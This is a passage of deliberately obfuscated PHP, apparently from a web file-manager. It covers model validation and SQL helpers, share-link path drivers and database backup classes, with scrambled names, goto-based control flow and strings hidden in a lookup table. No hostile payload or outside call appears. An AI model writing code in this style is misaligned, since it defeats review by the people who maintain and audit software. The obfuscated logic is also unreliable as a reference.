($this->autoCheckFields) { $bٶ = $this->getDbFields(); foreach ($Bᄣ as $F㣿 => $D) { if (!in_array($F㣿, $bٶ)) { unset($Bᄣ[$F㣿]); } elseif (MAGIC_QUOTES_GPC && is_string($D)) { $Bᄣ[$F㣿] = stripslashes($D); } } } $this->autoOperation($Bᄣ, $C); $this->data = $Bᄣ; goto A䫣; eɻ颯: if (isset($bٶ)) { if (is_string($bٶ)) { $bٶ = explode($Fе˂[47], $bٶ); } if (think_config($Fе˂[296])) { $bٶ[] = think_config($Fе˂[297]); } foreach ($Bᄣ as $F㣿 => $D) { if (!in_array($F㣿, $bٶ)) { unset($Bᄣ[$F㣿]); } } } if (!$this->autoValidation($Bᄣ, $C)) { return !1; } if (!$this->autoCheckToken($Bᄣ)) { $this->error = think_lang($Fе˂[298]); return !1; } goto DÆ; E델γ: } public function autoCheckToken($F̂) { $dЧ =& $_SERVER[̉]; if (isset($this->options[$dЧ[299]]) && !$this->options[$dЧ[299]]) { return !0; } if (think_config($dЧ[296])) { $B = think_config($dЧ[297]); if (!isset($F̂[$B]) || Session::get($B)) { return !1; } list($eڵț, $b) = explode($dЧ[71], $F̂[$B]); if ($b && Session::get($B . $dЧ[95] . $eڵț) === $b) { Session::remove($B . $dЧ[95] . $eڵț); return !0; } if (think_config($dЧ[300])) { Session::remove($B . $dЧ[95] . $eڵț); } return !1; } return !0; } public function regex($Cи, $f) { $d렯 =& $_SERVER[̉]; $d΂Ҧ = array($d렯[301] => $d렯[302], $d렯[303] => $d렯[304], $d렯[305] => $d렯[306], $d렯[307] => $d렯[308], $d렯[309] => $d렯[310], $d렯[311] => $d렯[312], $d렯[313] => $d렯[314], $d렯[288] => $d렯[315], $d렯[316] => $d렯[317]); if (isset($d΂Ҧ[strtolower($f)])) { $f = $d΂Ҧ[strtolower($f)]; } return preg_match($f, $Cи) === 1; } private function autoOperation(&$då, $eۃ) { $C܄ݐ =& $_SERVER[̉]; if (!empty($this->options[$C܄ݐ[318]])) { $BŎ = $this->options[$C܄ݐ[318]]; unset($this->options[$C܄ݐ[318]]); } elseif (!empty($this->_auto)) { $BŎ = $this->_auto; } if (isset($BŎ)) { foreach ($BŎ as $B񄆭) { if (empty($B񄆭[2])) { $B񄆭[2] = THINK_MODEL_INSERT; } if ($eۃ == $B񄆭[2] || $B񄆭[2] == THINK_MODEL_BOTH) { switch (trim($B񄆭[3])) { case $C܄ݐ[319]: case $C܄ݐ[320]: $a݌ = isset($B񄆭[4]) ? (array) $B񄆭[4] : array(); if (isset($då[$B񄆭[0]])) { array_unshift($a݌, $då[$B񄆭[0]]); } if ($C܄ݐ[319] == $B񄆭[3]) { $då[$B񄆭[0]] = call_user_func_array($B񄆭[1], $a݌); } else { $då[$B񄆭[0]] = call_user_func_array(array(&$this, $B񄆭[1]), $a݌); } break; case $C܄ݐ[271]: $då[$B񄆭[0]] = $då[$B񄆭[1]]; break; case $C܄ݐ[321]: if ($C܄ݐ[33] === $då[$B񄆭[0]]) { unset($då[$B񄆭[0]]); } break; case $C܄ݐ[322]: default: $då[$B񄆭[0]] = $B񄆭[1]; } if (!1 === $då[$B񄆭[0]]) { unset($då[$B񄆭[0]]); } } } } return $då; } protected function autoValidation($cݕ, $f¨) { $d歕ݎ =& $_SERVER[̉]; if (!empty($this->options[$d歕ݎ[323]])) { $Dϵ = $this->options[$d歕ݎ[323]]; unset($this->options[$d歕ݎ[323]]); } elseif (!empty($this->_validate)) { $Dϵ = $this->_validate; } if (isset($Dϵ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($Dϵ as $d⫬ => $aǨ) { if (empty($aǨ[5]) || $aǨ[5] == THINK_MODEL_BOTH || $aǨ[5] == $f¨) { if (0 == strpos($aǨ[2], $d歕ݎ[324]) && strpos($aǨ[2], $d歕ݎ[325])) { $aǨ[2] = think_lang(substr($aǨ[2], 2, -1)); } $aǨ[3] = isset($aǨ[3]) ? $aǨ[3] : THINK_EXISTS_VALIDATE; $aǨ[4] = isset($aǨ[4]) ? $aǨ[4] : $d歕ݎ[326]; switch ($aǨ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($cݕ, $aǨ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($d歕ݎ[33] != trim($cݕ[$aǨ[0]])) { if (!1 === $this->_validationField($cݕ, $aǨ)) { return !1; } } break; default: if (isset($cݕ[$aǨ[0]])) { if (!1 === $this->_validationField($cݕ, $aǨ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($CĶ, $F韝²) { if (!1 === $this->_validationFieldItem($CĶ, $F韝²)) { if ($this->patchValidate) { $this->error[$F韝²[0]] = $F韝²[2]; } else { $this->error = $F韝²[2]; return !1; } } return; } protected function _validationFieldItem($f刲, $Cٴʵ) { $DɄŗ =& $_SERVER[̉]; switch (strtolower(trim($Cٴʵ[4]))) { case $DɄŗ[319]: case $DɄŗ[320]: $aӘ = isset($Cٴʵ[6]) ? (array) $Cٴʵ[6] : array(); if (is_string($Cٴʵ[0]) && strpos($Cٴʵ[0], $DɄŗ[47])) { $Cٴʵ[0] = explode($DɄŗ[47], $Cٴʵ[0]); } if (is_array($Cٴʵ[0])) { foreach ($Cٴʵ[0] as $aΕ) { $cР[$aΕ] = $f刲[$aΕ]; } array_unshift($aӘ, $cР); } else { array_unshift($aӘ, $f刲[$Cٴʵ[0]]); } if ($DɄŗ[319] == $Cٴʵ[4]) { return call_user_func_array($Cٴʵ[1], $aӘ); } else { return call_user_func_array(array(&$this, $Cٴʵ[1]), $aӘ); } case $DɄŗ[327]: return $f刲[$Cٴʵ[0]] == $f刲[$Cٴʵ[1]]; case $DɄŗ[328]: if (is_string($Cٴʵ[0]) && strpos($Cٴʵ[0], $DɄŗ[47])) { $Cٴʵ[0] = explode($DɄŗ[47], $Cٴʵ[0]); } $b換 = array(); if (is_array($Cٴʵ[0])) { foreach ($Cٴʵ[0] as $aΕ) { $b換[$aΕ] = $f刲[$aΕ]; } } else { $b換[$Cٴʵ[0]] = $f刲[$Cٴʵ[0]]; } if (!empty($f刲[$this->getPk()])) { $b換[$this->getPk()] = array($DɄŗ[329], $f刲[$this->getPk()]); } if ($this->where($b換)->find()) { return !1; } return !0; default: return $this->check($f刲[$Cٴʵ[0]], $Cٴʵ[1], $Cٴʵ[4]); } } public function check($D, $d, $c냆 = "\162\x65\147\x65\x78") { $aܕͤĉ =& $_SERVER[̉]; $c냆 = strtolower(trim($c냆)); switch ($c냆) { case $aܕͤĉ[7]: case $aܕͤĉ[330]: $fڒ = is_array($d) ? $d : explode($aܕͤĉ[47], $d); return $c냆 == $aܕͤĉ[7] ? in_array($D, $fڒ) : !in_array($D, $fڒ); case $aܕͤĉ[331]: case $aܕͤĉ[332]: if (is_array($d)) { $fٶ = $d[0]; $FҠ = $d[1]; } else { list($fٶ, $FҠ) = explode($aܕͤĉ[47], $d); } return $c냆 == $aܕͤĉ[331] ? $D >= $fٶ && $D <= $FҠ : $D < $fٶ || $D > $FҠ; case $aܕͤĉ[333]: case $aܕͤĉ[334]: return $c냆 == $aܕͤĉ[333] ? $D == $d : $D != $d; case $aܕͤĉ[335]: $BĜ鿄 = mb_strlen($D, $aܕͤĉ[336]); if (strpos($d, $aܕͤĉ[47])) { list($fٶ, $FҠ) = explode($aܕͤĉ[47], $d); return $BĜ鿄 >= $fٶ && $BĜ鿄 <= $FҠ; } else { return $BĜ鿄 == $d; } case $aܕͤĉ[337]: list($Aʆ, $cϗ) = explode($aܕͤĉ[47], $d); if (!is_numeric($Aʆ)) { $Aʆ = strtotime($Aʆ); } if (!is_numeric($cϗ)) { $cϗ = strtotime($cϗ); } return NOW_TIME >= $Aʆ && NOW_TIME <= $cϗ; case $aܕͤĉ[338]: return in_array(get_client_ip(), explode($aܕͤĉ[47], $d)); case $aܕͤĉ[339]: return !in_array(get_client_ip(), explode($aܕͤĉ[47], $d)); case $aܕͤĉ[326]: default: return $this->regex($D, $d); } } public function query($a㱪, $B紪 = false) { $bÃ =& $_SERVER[̉]; if (!is_bool($B紪) && !is_array($B紪)) { $B紪 = func_get_args(); array_shift($B紪); } $a㱪 = str_replace(array($bÃ[229], $bÃ[340]), $bÃ[50], $a㱪); $a㱪 = $this->parseSql($a㱪, $B紪); return $this->db->query($a㱪); } public function execute($F, $D = false) { if (!is_bool($D) && !is_array($D)) { $D = func_get_args(); array_shift($D); } $F = $this->parseSql($F, $D); return $this->db->execute($F); } protected function parseSql($aɒ, $a) { $B =& $_SERVER[̉]; if (!0 === $a) { $e͉ = $this->_parseOptions(); $aɒ = $this->db->parseSql($aɒ, $e͉); } elseif (is_array($a)) { $a = array_map(array($this->db, $B[341]), $a); $aɒ = vsprintf($aɒ, $a); } else { $aɒ = strtr($aɒ, array($B[342] => $this->getTableName(), $B[343] => think_config($B[242]))); } $this->db->setModel($this->name); return $aɒ; } public function db($bߤ = '', $fպ = '', $E腈Ð = array()) { goto d; d: $eӢ =& $_SERVER[̉]; if ($eӢ[33] === $bߤ && $this->db) { return $this->db; } static $A۲ = array(); goto d힄; Fޜ: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto e܉ؼ; Dهҍ: $A۲[$bߤ] = $fպ; $this->db = $A٪[$bߤ]; $this->_after_db(); goto Fޜ; d힄: static $A٪ = array(); if (!isset($A٪[$bߤ]) || isset($A٪[$bߤ]) && $fպ && $A۲[$bߤ] != $fպ) { if (!empty($fպ) && is_string($fպ) && !1 === strpos($fպ, $eӢ[8])) { $fպ = think_config($fպ); } $A٪[$bߤ] = Db::getInstance($fպ); } elseif (NULL === $fպ) { $A٪[$bߤ]->close(); unset($A٪[$bߤ]); return; } if (!empty($E腈Ð)) { if (is_string($E腈Ð)) { parse_str($E腈Ð, $E腈Ð); } foreach ($E腈Ð as $Bɻ݂ => $eҋ) { $this->setProperty($Bɻ݂, $eҋ); } } goto Dهҍ; e܉ؼ: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Eۮ = get_class($this); if ($Eۮ == $_SERVER[̉][344]) { return $this->name; } $this->name = substr($Eۮ, 0, -5); } return $this->name; } public function getTableName() { $BՈ =& $_SERVER[̉]; if (empty($this->trueTableName)) { $Dă = !empty($this->tablePrefix) ? $this->tablePrefix : $BՈ[33]; if (!empty($this->tableName)) { $Dă .= $this->tableName; } else { $Dă .= think_parse_name($this->name); } $this->trueTableName = strtolower($Dă); } return (!empty($this->dbName) ? $this->dbName . $BՈ[95] : $BՈ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $A =& $_SERVER[̉]; return isset($this->fields[$A[249]]) ? $this->fields[$A[249]] : $this->pk; } public function getDbFields() { $dި =& $_SERVER[̉]; if (isset($this->options[$dި[277]])) { $Cʡ = $this->db->getFields($this->options[$dި[277]]); return $Cʡ ? array_keys($Cʡ) : !1; } if ($this->fields) { $Cʡ = $this->fields; unset($Cʡ[$dި[248]], $Cʡ[$dި[249]], $Cʡ[$dި[250]], $Cʡ[$dި[247]]); return $Cʡ; } return !1; } public function data($dձ = '') { $F׈ą =& $_SERVER[̉]; if ($F׈ą[33] === $dձ && !empty($this->data)) { return $this->data; } if (is_object($dձ)) { $dձ = get_object_vars($dձ); } elseif (is_string($dձ)) { parse_str($dձ, $dձ); } elseif (!is_array($dձ)) { think_exception(think_lang($F׈ą[269])); } $this->data = $dձ; return $this; } public function join($a严) { $E =& $_SERVER[̉]; if (is_array($a严)) { $this->options[$E[280]] = $a严; } elseif (!empty($a严)) { $this->options[$E[280]][] = $a严; } return $this; } public function union($e׭ͻ, $E⥞ = false) { goto B; Eς: return $this; goto D; B: $E㙹 =& $_SERVER[̉]; if (empty($e׭ͻ)) { return $this; } if ($E⥞) { $this->options[$E㙹[345]][$E㙹[346]] = !0; } goto c; c: if (is_object($e׭ͻ)) { $e׭ͻ = get_object_vars($e׭ͻ); } if (is_string($e׭ͻ)) { $cà = $e׭ͻ; } elseif (is_array($e׭ͻ)) { if (isset($e׭ͻ[0])) { $this->options[$E㙹[345]] = array_merge($this->options[$E㙹[345]], $e׭ͻ); return $this; } else { $cà = $e׭ͻ; } } else { think_exception(think_lang($E㙹[269])); } $this->options[$E㙹[345]][] = $cà; goto Eς; D: } public function cache($b㒮 = true, $D߽Ԣ = null, $Fݐ = '') { $eִ =& $_SERVER[̉]; if (!1 !== $b㒮) { $this->options[$eִ[347]] = array($eִ[93] => $b㒮, $eִ[337] => $D߽Ԣ, $eִ[29] => $Fݐ); } return $this; } public function field($AۋӲ, $Dߠᝈ = false) { $Aۘˇ =& $_SERVER[̉]; if (!0 === $AۋӲ) { $F = $this->getDbFields(); $AۋӲ = $F ? $F : $Aۘˇ[182]; } elseif ($Dߠᝈ) { if (is_string($AۋӲ)) { $AۋӲ = explode($Aۘˇ[47], $AۋӲ); } $F = $this->getDbFields(); $AۋӲ = $F ? array_diff($F, $AۋӲ) : $AۋӲ; } $this->options[$Aۘˇ[271]] = $AۋӲ; return $this; } public function scope($F׬ = '', $bٞɟ = NULL) { $B۩ =& $_SERVER[̉]; if ($B۩[33] === $F׬) { if (isset($this->_scope[$B۩[34]])) { $Aԝ = $this->_scope[$B۩[34]]; } else { return $this; } } elseif (is_string($F׬)) { $Dǚ = explode($B۩[47], $F׬); $Aԝ = array(); foreach ($Dǚ as $aщ) { if (!isset($this->_scope[$aщ])) { continue; } $Aԝ = array_merge($Aԝ, $this->_scope[$aщ]); } if (!empty($bٞɟ) && is_array($bٞɟ)) { $Aԝ = array_merge($Aԝ, $bٞɟ); } } elseif (is_array($F׬)) { $Aԝ = $F׬; } if (is_array($Aԝ) && !empty($Aԝ)) { $this->options = array_merge($this->options, array_change_key_case($Aԝ)); } return $this; } public function where($D藺, $DД = null) { $CԸ =& $_SERVER[̉]; if (!is_null($DД) && is_string($D藺)) { if (!is_array($DД)) { $DД = func_get_args(); array_shift($DД); } $DД = array_map(array($this->db, $CԸ[341]), $DД); $D藺 = vsprintf($D藺, $DД); } elseif (is_object($D藺)) { $D藺 = get_object_vars($D藺); } elseif (is_array($D藺)) { foreach ($D藺 as $fŬ => $D) { if ((is_numeric($fŬ) || !$fŬ) && is_string($D)) { if (strpos($D, $CԸ[348]) === 0) { continue; } think_trace($CԸ[349], $CԸ[33], $CԸ[46]); die; } } } if (is_string($D藺) && $CԸ[33] != $D藺) { $AѶ = array(); $AѶ[$CԸ[350]] = $D藺; $D藺 = $AѶ; } if (isset($this->options[$CԸ[273]])) { $this->options[$CԸ[273]] = array_merge($this->options[$CԸ[273]], $D藺); } else { $this->options[$CԸ[273]] = $D藺; } return $this; } public function limit($D, $EסŞ = null) { $Cݙ =& $_SERVER[̉]; $this->options[$Cݙ[290]] = is_null($EסŞ) ? $D : $D . $Cݙ[47] . $EסŞ; return $this; } public function page($Aī, $d = null) { $A =& $_SERVER[̉]; $this->options[$A[351]] = is_null($d) ? $Aī : $Aī . $A[47] . $d; return $this; } public function comment($d휿) { $this->options[$_SERVER[̉][352]] = $d휿; return $this; } public function setProperty($F, $B) { if (property_exists($this, $F)) { $this->{$F} = $B; } return $this; } } goto c; B: class PathDriverDriverShareItem { public function __construct($Eٿ) { $this->pathParse = $Eٿ; } public function __call($c若, $aǧ) { $Aٖ =& $_SERVER[̉]; if (method_exists($this, $c若)) { return; } $A؆琭 = call_user_func_array(array($Aٖ[1216], $c若), $aǧ); $bٖ = array($Aٖ[1217], $Aٖ[1218], $Aٖ[1219], $Aٖ[1220], $Aٖ[518], $Aٖ[520], $Aٖ[1221], $Aٖ[107], $Aٖ[1222], $Aٖ[1223]); if (in_array($c若, $bٖ)) { $A؆琭 = $this->getPathOuter($A؆琭); } return $A؆琭; } public function copy($B, $eȢ, $bÜ = false) { return $this->copyMove($B, $eȢ, $bÜ, $_SERVER[̉][518]); } public function move($e, $C׊Ⴅ, $D = false) { return $this->copyMove($e, $C׊Ⴅ, $D, $_SERVER[̉][520]); } private function copyMove($E쨬, $eѧ۔, $e, $Cίȧ) { goto F풋; F풋: $aݩ =& $_SERVER[̉]; $D϶ = $eѧ۔; $Fͣ = IO::driverMake($eѧ۔); goto A; A: if ($Fͣ->pathParse[$aݩ[1047]]) { $eѧ۔ = $Fͣ->pathParse[$aݩ[1047]]; } else { $eѧ۔ = $D϶; } $bݨ = IO::copyMove($E쨬, $eѧ۔, $e, $Cίȧ); $bݨ = $this->getPathOuter($bݨ); goto F; F: return $bݨ; goto A; A: } public function pathThis($D) { return get_path_this($this->pathParse[$_SERVER[̉][76]]); } public function pathFather($a·) { return get_path_father($this->pathParse[$_SERVER[̉][76]]); } public function iconvSystem($F) { return $F; } protected function infoParse($a؜׊, $b = false) { $c =& $_SERVER[̉]; $eӈ = $this->pathParse[$c[466]][$c[1070]] . $this->pathParse[$c[1063]]; if ($b) { $FȔ = IO::infoWithChildren($eӈ); } else { $FȔ = IO::info($eӈ); } $Fî갌 = $this->pathParse[$c[466]]; return Action($c[1213])->_shareItemeParse($FȔ, $Fî갌); } public function listAll($Eڢ) { $B҆ =& $_SERVER[̉]; $dچֈ = IO::listAll($Eڢ); $b߷ = $this->pathParse[$B҆[466]]; foreach ($dچֈ as &$cۤś) { check_abort(); $F韛 = IO::info($cۤś[$B҆[76]]); $F韛 = is_array($F韛) ? $F韛 : array(); $cۤś = array_merge($F韛, $cۤś); $cۤś[$B҆[85]] = Action($B҆[1213])->_shareItemeParse($cۤś, $b߷); } unset($cۤś); return $dچֈ; } public function getPathOuter($e) { goto D; D: $DĈ =& $_SERVER[̉]; $fМ = KodIO::parse($e); if ($fМ[$DĈ[29]] == KodIO::KOD_SHARE_ITEM) { return $fМ[$DĈ[76]]; } goto b; b: $bտɬ = KodIO::clear($e); $f͈Ք = KodIO::clear($this->pathParse[$DĈ[466]][$DĈ[1070]]); $e = substr($bտɬ, strlen($f͈Ք)); goto D; D: if (substr($bտɬ, 0, strlen($f͈Ք)) != $f͈Ք) { return !1; } return $this->pathParse[$DĈ[1064]] . $DĈ[8] . ltrim($e, $DĈ[8]); goto Aᡋ; Aᡋ: } public function getType() { $e =& $_SERVER[̉]; $bô = str_replace($e[72], $e[33], get_class($this)); return strtolower($bô); } public function isTypeObject($f) { return IO::isTypeObject($f); } public function info($bԬˌ) { return $this->infoParse($bԬˌ); } public function infoAuth($A) { return $this->infoParse($A); } public function infoWithChildren($Fԧ) { return $this->infoParse($Fԧ, !0); } public function infoFull($fיس) { return $this->infoParse($fיس); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($a˶) { $this->pathParse = $a˶; } protected function infoParse($e, $d̯ = false) { $Eɴ =& $_SERVER[̉]; return Action($Eɴ[1069])->sharePathInfo($this->pathParse[$Eɴ[76]], !0, $d̯); } public function listPath($a؂, $E׏ = false) { $c =& $_SERVER[̉]; $E˷ = IO::listPath($a؂, $E׏); foreach ($E˷ as $Aũ҆ => $CÅ) { if (!in_array($Aũ҆, array($c[74], $c[75]))) { continue; } foreach ($CÅ as $d᧱ => $AȂ) { $AȂ = Action($c[1224])->parsePathChildren($AȂ, array($c[414] => $a؂)); $E˷[$Aũ҆][$d᧱] = Action($c[1069])->shareItemInfo($AȂ); } } return $E˷; } public function listAll($BƑ̽) { $Dеݔ =& $_SERVER[̉]; $B׫ǫ = IO::listAll($BƑ̽); foreach ($B׫ǫ as &$Dߩ) { $Aؕ = IO::info($Dߩ[$Dеݔ[76]]); $Aؕ = is_array($Aؕ) ? $Aؕ : array(); $Dߩ = array_merge($Aؕ, $Dߩ); $Dߩ[$Dеݔ[85]] = Action($Dеݔ[1069])->shareItemInfo($Dߩ); } unset($Dߩ); return $B׫ǫ; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($DȺ) { parent::__construct($DȺ); } } goto Eƃ; a: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $FϙҘ =& $_SERVER[̉]; $this->isManual(); self::$name = date($FϙҘ[711]); if (!($c = Model($FϙҘ[712])->lastItem())) { $c = $this->initData(); } else { self::$name = $c[$FϙҘ[28]]; if ($c[$FϙҘ[713]] == $FϙҘ[87]) { self::$name = date($FϙҘ[714]); $FĆό = 0; if (isset($c[$FϙҘ[291]][$FϙҘ[193]][$FϙҘ[447]])) { $FĆό = (int) $c[$FϙҘ[291]][$FϙҘ[193]][$FϙҘ[447]]; } if (self::$manual == 0 && $c[$FϙҘ[28]] == self::$name) { Model($FϙҘ[712])->remove($c[$FϙҘ[393]]); } $c = $this->initData($FĆό, $c[$FϙҘ[715]]); } else { $this->checkStore($c[$FϙҘ[715]]); } } self::$option = $c; } private function isManual() { $fŶ͍ܡ = _get($GLOBALS, $_SERVER[̉][716], 0); $fŶ͍ܡ = intval($fŶ͍ܡ); self::$manual = $fŶ͍ܡ && $fŶ͍ܡ == 1 ? 1 : 0; } private function initData($cի = 0, $A͘ = '') { goto Aσ; AǑǐ: $fӞ = Model($fÍ[712])->insert($cχ); $cχ[$fÍ[393]] = $fӞ; return $cχ; goto Fܰ; Aσ: $fÍ =& $_SERVER[̉]; $bñË = Model($fÍ[712])->config(); if ($A͘ && $bñË[$fÍ[715]] != $A͘) { $cի = 0; } goto cČÅЇ; cČÅЇ: $this->checkStore($bñË[$fÍ[715]]); if (self::$manual == 1) { self::$name .= $fÍ[71] . date($fÍ[717]); } $cχ = array($fÍ[715] => $bñË[$fÍ[715]], $fÍ[28] => self::$name, $fÍ[713] => 0, $fÍ[718] => $bñË[$fÍ[718]], $fÍ[719] => self::$manual, $fÍ[291] => array($fÍ[720] => array($fÍ[713] => 0), $fÍ[721] => array($fÍ[713] => 0, $fÍ[722] => 0, $fÍ[723] => 0, $fÍ[29] => $fÍ[33], $fÍ[724] => 0, $fÍ[476] => 0), $fÍ[725] => array($fÍ[713] => 0, $fÍ[722] => 0, $fÍ[723] => 0, $fÍ[724] => 0, $fÍ[476] => 0), $fÍ[193] => array($fÍ[713] => 0, $fÍ[726] => 0, $fÍ[727] => 0, $fÍ[728] => 0, $fÍ[729] => 0, $fÍ[447] => $cի, $fÍ[724] => 0, $fÍ[476] => 0)), $fÍ[724] => time(), $fÍ[476] => 0); goto AǑǐ; Fܰ: } private function checkStore($EƄΜ) { $dނ =& $_SERVER[̉]; $dӴ = Model($dނ[730])->listData($EƄΜ); Model($dނ[730])->checkConfig($dӴ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[̉][712])->findByName(self::$name); } return self::$option; } public static function set($Dܘ) { $F҂ =& $_SERVER[̉]; $eŦޚ = self::get(); foreach ($Dܘ as $C갢 => $FƳ) { $c = explode($F҂[95], $C갢); $c݃ = count($c); switch ($c݃) { case 1: $eŦޚ[$c[0]] = $FƳ; break; case 2: $eŦޚ[$c[0]][$c[1]] = $FƳ; break; case 3: $eŦޚ[$c[0]][$c[1]][$c[2]] = $FƳ; break; } } Model($F҂[712])->update($eŦޚ[$F҂[393]], $eŦޚ); self::$option = $eŦޚ; return self::$option; } public function keep() { $a =& $_SERVER[̉]; $Fƒɽ = self::get(); if ($Fƒɽ[$a[291]][$a[720]][$a[713]] == $a[87]) { return; } $this->backupKeep($Fƒɽ); self::set(array($a[731] => 1)); } private function backupKeep($A) { goto Cٔ; A۵: $B = Model($e˛[733])->get($e˛[734]); foreach ($dǐ as $b) { if (isset($b[$e˛[719]]) && $b[$e˛[719]] == $e˛[87]) { continue; } if (!empty($b[$e˛[28]]) && in_array($b[$e˛[28]], $fг)) { continue; } Model($e˛[712])->remove($b[$e˛[393]]); $e = $this->backupPath($A, $B); IO::remove($e, !1); } goto aՍ; Fҏ҅: if (empty($dǐ)) { return; } $Eˋ = 0; $fг = array(); goto bډ; Cٔ: $e˛ =& $_SERVER[̉]; if (self::$manual == 1) { return; } $dǐ = Model($e˛[712])->listData(); goto Fҏ҅; bډ: foreach ($dǐ as $b) { if ($Eˋ >= 7) { break; } $fг[] = $b[$e˛[28]]; $Eˋ++; } for ($Eˋ = 0; $Eˋ < 12; $Eˋ++) { $fг[] = date($e˛[732], strtotime("\55{$Eˋ}\40\155\157\x6e\x74\150\163")); } $fг = array_unique($fг); goto A۵; aՍ: } private function backupPath($cΉЬ, $Cɑ = false) { $Bð㨵 =& $_SERVER[̉]; if (!$Cɑ) { $Cɑ = Model($Bð㨵[733])->get($Bð㨵[734]); } $F݇ = $cΉЬ[$Bð㨵[28]]; $Fء = substr(md5($Bð㨵[735] . $Cɑ . $F݇), 0, 8); return "\173\x69\157\72{$cΉЬ[$Bð㨵[715]]}\175\x2f\x64\141\164\141\142\x61\163\x65\57\142\x61\x63\x6b\165\x70\57" . $F݇ . $Bð㨵[71] . $Fء; } public function db() { goto cɄ; cɄ: $C =& $_SERVER[̉]; $b񹂅 = self::get(); if ($b񹂅[$C[291]][$C[721]][$C[713]] == $C[87]) { return !0; } goto E; E: $a = new BackupDb(); if (!$a->index()) { return !1; } self::set(array($C[736] => 1)); goto E袯; E袯: return !0; goto CǴᇉ; CǴᇉ: } public function dbFile() { goto cÔ̌; C·: return !0; goto a; cÔ̌: $F =& $_SERVER[̉]; $fƉ = self::get(); if ($fƉ[$F[291]][$F[725]][$F[713]] == $F[87]) { return !0; } goto bՌ; bՌ: $bڶ = new BackupDbFile(); if (!$bڶ->index()) { return !1; } self::set(array($F[737] => 1)); goto C·; a: } public function file() { $D𔴶 =& $_SERVER[̉]; $d輪 = self::get(); if ($d輪[$D𔴶[291]][$D𔴶[193]][$D𔴶[713]] == $D𔴶[87]) { return !0; } if (!isset($d輪[$D𔴶[718]]) || $d輪[$D𔴶[718]] == $D𔴶[191]) { $b䕍 = new BackupFile(); if (!$b䕍->index()) { return !1; } } self::set(array($D𔴶[738] => 1, $D𔴶[713] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto Eר; c׬: Backup::set($F); if ($B䟒͌ > $Fɧ) { write_log(array($c[756], $F), $c[745]); return !1; } return !0; goto b˅͏; F: $B䟒͌ = $Fɧ = 0; try { $DѪ = $C->db()->getTables(); } catch (Exception $Aݹ) { return !1; } $DѪ = array_diff($DѪ, array($c[742], $c[743])); goto bۘ; b: $fٯ = $this->tmpFilesPath() . $c[741] . self::$name . $c[8]; del_dir($fٯ); mk_dir($fٯ); goto F; eɶҚ: if (isset($a҃->task[$c[751]])) { $eɢ = $a҃->task[$c[751]] ? $a҃->task[$c[751]] : timeFloat(); $c = $eɢ - $a҃->task[$c[752]]; if ($c >= 0.2) { $B䟒͌ += 1; } } $a҃->end(); $F = array($c[739] => $Cܽ, $c[736] => 1, $c[753] => $B䟒͌, $c[754] => $Fɧ, $c[755] => time()); goto c׬; a║Ɋ: $C = new DbManage($cǝ狅, $Cܽ); $F = array($c[739] => $Cܽ, $c[740] => time()); Backup::set($F); goto b; cֽ: self::$name = $aִ[$c[28]]; $cǝ狅 = $GLOBALS[$c[6]][$c[17]]; $Cܽ = $this->_dbType($cǝ狅); goto a║Ɋ; bۘ: foreach ($DѪ as $bʂȣ) { $B䟒͌ += $C->model($bʂȣ)->count(); } $a҃ = new Task($c[744], $c[745], $B䟒͌, LNG($c[746]) . $c[747] . LNG($c[748])); foreach ($DѪ as $bʂȣ) { $C = $fٯ . $bʂȣ . $c[749]; $a襩 = null; if ($bʂȣ == $c[750] && (!isset($aִ[$c[718]]) || $aִ[$c[718]] == $c[191])) { $a襩 = self::$io; } $Fɧ += $C->sqlFromDb($bʂȣ, $C, $a҃, $a襩); } goto eɶҚ; Eר: $c =& $_SERVER[̉]; $aִ = Backup::get(); self::$io = $aִ[$c[715]]; goto cֽ; b˅͏: } private function _dbType($b) { goto a; EՎ: return $d; goto a˽; cÎ: if ($d == $D[758]) { $D = explode($D[4], $b[$D[759]]); $d = $D[0]; } $cҜ = array($D[760] => $D[9], $D[761] => $D[762]); if (isset($cҜ[$d])) { $d = $cҜ[$d]; } goto EՎ; a: $D =& $_SERVER[̉]; $b = array_change_key_case($b); $d = $b[$D[757]]; goto cÎ; a˽: } private function tmpFilesPath() { $Bվ =& $_SERVER[̉]; $A劐 = TEMP_FILES; if ($GLOBALS[$Bվ[6]][$Bվ[88]][$Bվ[763]]) { $A劐 = $GLOBALS[$Bվ[6]][$Bվ[88]][$Bվ[763]]; if (!mk_dir($A劐) || !is_writable($A劐) || !IO::mkfile($A劐 . $Bվ[764])) { $A劐 = TEMP_FILES; } } return $A劐; } } class BackupDbFile { public function __construct() { } public function index() { goto dׇҋ; d蝒ϙ: Backup::set($Aޠ); return !0; goto d꣎; fʊٕ: if (!$Dַ) { return !1; } $Aޠ = array($Aĝ[765] => $Dַ, $Aĝ[766] => time()); Backup::set($Aޠ); goto DͯС; dׇҋ: $Aĝ =& $_SERVER[̉]; $B̶ = Backup::get(); $dԅĵ = $B̶[$Aĝ[28]]; goto CɊ; CɊ: $Aɋꡋ = $this->tmpFilesPath() . "\x62\141\143\153\x75\160\x5f{$dԅĵ}\x2f"; $A = $this->backupPath($B̶); if (!($A = IO::mkdir($A))) { return !1; } goto cӽ; Fߓ: IO::copy($c, $A); $Fú->end(); $Aޠ = array($Aĝ[773] => $Dַ, $Aĝ[774] => time()); goto d蝒ϙ; C卑: $f𡥻 = CONTROLLER_DIR . $Aĝ[771]; $c = CONTROLLER_DIR . $Aĝ[772]; IO::copy($f𡥻, $A); goto Fߓ; DͯС: $Fú = new TaskFileTransfer($Aĝ[767], $Aĝ[745], count($DǨ), LNG($Aĝ[746]) . $Aĝ[440] . 